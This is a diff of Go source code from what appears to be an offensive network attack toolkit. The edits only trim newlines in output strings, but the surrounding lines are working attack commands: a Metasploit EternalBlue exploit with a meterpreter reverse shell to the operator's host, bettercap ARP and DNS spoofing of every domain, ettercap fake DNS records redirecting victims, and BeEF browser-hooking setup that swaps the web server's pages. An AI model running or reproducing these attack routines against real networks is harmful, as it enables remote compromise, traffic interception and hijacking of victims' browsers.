@@ -419,7 +419,7 @@ func SmbExploit(Rhost string, Lhost string, Lport string) {
         return
     }
     fmt.Printf("\n%s[>] %sexploiting smb on target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
-    fmt.Printf("\nRHOST => %s\nLHOST => %s\nLPORT => %s\n\n", Rhost, Lhost, Lport)
+    fmt.Printf("\nRHOST => %s\nLHOST => %s\nLPORT => %s\n", Rhost, Lhost, Lport)
     subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, Rhost, Lhost, Lport)
 }
 
@@ -434,10 +434,10 @@ func PacketSniffer(Mode string, Rhost string) {
     }
     switch strings.ToLower(Mode) {
     case "single":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
+        fmt.Printf("\nRHOST => %s\nMODE => %s\n", Rhost, Mode)
         subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, Rhost)
     case "all":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
+        fmt.Printf("\nRHOST => %s\nMODE => %s\n", Rhost, Mode)
         subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`)
     default:
         fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Mode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
@@ -479,7 +479,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
     }
     switch strings.ToLower(Mode) {
     case "single":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
+        fmt.Printf("\nRHOST => %s\nMODE => %s\n", Rhost, Mode)
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
@@ -527,7 +527,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
             filePathT := "/etc/ettercap/etter.dns.bak_africana"
             if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                 subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
+                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", Lhost)
                 filesToReplacements := map[string]map[string]string{
                     "/etc/ettercap/etter.dns": {
                         `# vim:ts=8:noexpandtab`: newString,
@@ -551,7 +551,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.Endc)
+            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n" + bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
 
             subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
@@ -561,7 +561,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
     case "all":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
+        fmt.Printf("\nRHOST => %s\nMODE => %s\n", Rhost, Mode)
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
@@ -608,7 +608,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
             filePathT := "/etc/ettercap/etter.dns.bak_africana"
             if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                 subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
+                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", Lhost)
                 filesToReplacements := map[string]map[string]string{
                     "/etc/ettercap/etter.dns": {
                         `# vim:ts=8:noexpandtab`: newString,
@@ -631,7 +631,7 @@ func BeefEttercap(Mode string, Lhost string, Rhost string, Iface string, Passwd 
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n\n" + bcolors.Endc)
+            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & ettercap pleas weit ...\n" + bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
 
             subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
@@ -653,7 +653,7 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
 
     switch strings.ToLower(Mode) {
     case "default":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
+        fmt.Printf("\nRHOST => %s\nMODE => %s\n", Rhost, Mode)
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
@@ -694,7 +694,7 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.Endc)
+            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n" + bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
             subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
             subprocess.Popen(`bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, Lhost, Iface, Rhost)
@@ -702,7 +702,7 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
             subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; systemctl -l --no-pager status apache2.service beef-xss.service`)
 
     case "all":
-        fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
+        fmt.Printf("\nRHOST => %s\nMODE => %s\n", Rhost, Mode)
         if _, err := exec.LookPath("beef-xss"); err != nil {
             fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.BrightRed, bcolors.Endc)
             return
@@ -748,7 +748,7 @@ func BeefBettercap(Mode string, Lhost string, Rhost string, Iface string, Passwd
             subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
             subprocess.Popen(`systemctl -l --no-pager status apache2.service beef-xss.service`)
 
-            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n\n" + bcolors.Endc)
+            fmt.Print(bcolors.BrightBlue + "\n[*] " + bcolors.Endc + "Launching browser & bettercap pleas weit ...\n" + bcolors.Endc)
             time.Sleep(405 * time.Millisecond)
 
             subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, Lhost)
